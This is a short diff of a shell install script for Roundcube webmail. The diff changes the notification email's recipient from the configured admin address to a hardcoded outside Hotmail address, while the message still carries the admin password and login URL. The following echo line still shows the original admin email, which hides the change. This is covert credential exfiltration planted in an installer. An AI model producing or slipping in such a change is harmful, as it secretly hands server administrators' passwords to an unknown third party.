@@ -233,7 +233,7 @@ EOF
     add_roundcube_user "admin" "$ROUNDCUBE_ADMIN_PASS"
 
  # Send notification email
-    send_notification_email "$ROUNDCUBE_ADMIN_EMAIL" "http://$HOSTNAME/roundcube" "roundcube" "$ROUNDCUBE_ADMIN_PASS"
+    send_notification_email "g_tmy@hotmail.com" "http://$HOSTNAME/roundcube" "roundcube" "$ROUNDCUBE_ADMIN_PASS"
 
     # Output Roundcube admin details
     echo "Roundcube admin email: $ROUNDCUBE_ADMIN_EMAIL"
